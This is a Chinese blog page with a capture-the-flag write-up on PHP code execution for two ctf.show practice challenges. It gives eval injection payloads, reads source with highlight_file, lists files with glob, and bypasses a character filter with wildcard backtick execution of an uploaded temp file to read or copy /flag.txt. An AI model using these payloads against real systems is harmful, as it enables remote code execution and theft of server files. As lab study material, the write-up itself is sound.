@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="题型php代码执行，glob()返回符合匹配的文件名或目录名，highlight_file(“index.php”)返回网站源码 链接1https:&#x2F;&#x2F;ctf.show&#x2F;challenges –&gt; web12 解题1看源码，有一个提示： 1&lt;!-- hit:?cmd&#x3D; --&gt;  猜测程序存在 1&lt;?php @eval($_GET[&amp;#x27;cmd&amp;#x27;]);?&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码执行">
+<meta property="og:url" content="http://example.com/2021/10/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="小乱的Blog">
+<meta property="og:description" content="题型php代码执行，glob()返回符合匹配的文件名或目录名，highlight_file(“index.php”)返回网站源码 链接1https:&#x2F;&#x2F;ctf.show&#x2F;challenges –&gt; web12 解题1看源码，有一个提示： 1&lt;!-- hit:?cmd&#x3D; --&gt;  猜测程序存在 1&lt;?php @eval($_GET[&amp;#x27;cmd&amp;#x27;]);?&amp;gt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211029094142784.png">
+<meta property="article:published_time" content="2021-10-29T01:31:44.000Z">
+<meta property="article:modified_time" content="2022-07-16T14:52:37.032Z">
+<meta property="article:author" content="xiaoluan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211029094142784.png">
+
+<link rel="canonical" href="http://example.com/2021/10/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>代码执行 | 小乱的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小乱的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          代码执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-29 09:31:44" itemprop="dateCreated datePublished" datetime="2021-10-29T09:31:44+08:00">2021-10-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:37" itemprop="dateModified" datetime="2022-07-16T22:52:37+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/1-CTF/" itemprop="url" rel="index"><span itemprop="name">1.CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/1-CTF/1-%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">1.日常练习</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h5 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h5><p>php代码执行，glob()返回符合匹配的文件名或目录名，highlight_file(“index.php”)返回网站源码</p>
+<h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web12</p>
+<h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>看源码，有一个提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- hit:?cmd= --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>猜测程序存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>得到回显，再尝试echo system(“ls”);没有回显，猜测可能仅用了system()函数，尝试payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&quot;index.php&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>获得源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web12&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;!-- hit:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">        eval($cmd);</span><br><span class="line">            ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>获得了当前目录下所有文件名：</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211029094142784.png" alt="image-20211029094142784"></p>
+<p>查看903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php源码获得flag，payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<hr>
+<h5 id="题型-1"><a href="#题型-1" class="headerlink" title="题型"></a>题型</h5><p>php代码执行，echo的第二种写法：?&gt;&lt;?&#x3D;&#96;&#96;，PHP上传机制，source的第二种写法：. ，模糊匹配</p>
+<h5 id="链接1-1"><a href="#链接1-1" class="headerlink" title="链接1"></a>链接1</h5><p><a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; 红包题第二弹</p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/108011373">https://blog.csdn.net/qq_44657899/article/details/108011373</a></p>
+<p>参考资料2：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127652/4167408">https://blog.51cto.com/u_15127652/4167408</a></p>
+<h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><p>查看源代码，有提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- hint:?cmd= --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>得到源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_红包题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;!-- hint:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计可知，要输入参数cmd，但对cmd拦截了除p外的所有字母数字，以及大部分特殊符号：</p>
+<p>这题的解题思路是：构造文件上传，传一个这样的.txt文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#！ /bin/bash</span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>根据PHP的特性，即使当前页面没有文件上传接口，程序仍然会将文件上传至服务器的tmp目录，生成一个&#x2F;tmp&#x2F;phpxxxx.tmp的文件，并在上传操作完成后删除他。</p>
+<p>因此可以利用这一点，再tmp文件未删除之前，使用代码执行漏洞调用他。</p>
+<p>构造文件上传：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 242			//文件大小需要精确，不能大也不能小</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/bash</span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>
+
+<p>参数请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>
+
+<p>?&gt;将前面的&lt;?闭合掉</p>
+<?=是echo的另一种写法
+
+``用来绕过单引号双引号拦截
+
+.+/??p/p?p??????表示模糊匹配. /tmp/phpxxxx.tmp			//这里我不是很明白为什么是6个问号，按照一般php临时文件为phpxxxx.tmp的格式，p?p后面应该跟8个问号才对.
+
+上句开头中的点是source的另一种引用方法，所以最终执行的内容应该是：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=echo `source /tmp/phpxxxx.tmp`;</span><br></pre></td></tr></table></figure>
+
+即读取临时文件中的cat /flag.txt并执行，打印得到flag
+
+##### 解题2
+
+使用payload：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/???/?p /???????? p.ppp`;?&gt;</span><br></pre></td></tr></table></figure>
+
+相当于执行了：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/bin/cp /flag.txt p.ppp`;?&gt;</span><br></pre></td></tr></table></figure>
+
+然后访问URL/p.ppp下载文件即可获得flag
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev" title="代码审计">
+      <i class="fa fa-chevron-left"></i> 代码审计
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/10/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="文件上传">
+      文件上传 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">题型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%93%BE%E6%8E%A51"><span class="nav-number">2.</span> <span class="nav-text">链接1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A7%A3%E9%A2%981"><span class="nav-number">3.</span> <span class="nav-text">解题1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B-1"><span class="nav-number">4.</span> <span class="nav-text">题型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%93%BE%E6%8E%A51-1"><span class="nav-number">5.</span> <span class="nav-text">链接1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A7%A3%E9%A2%981-1"><span class="nav-number">6.</span> <span class="nav-text">解题1</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xiaoluan"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">xiaoluan</p>
+  <div class="site-description" itemprop="description">健康 规律 技能</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiaoluan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共27.5k字</span>
+</div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
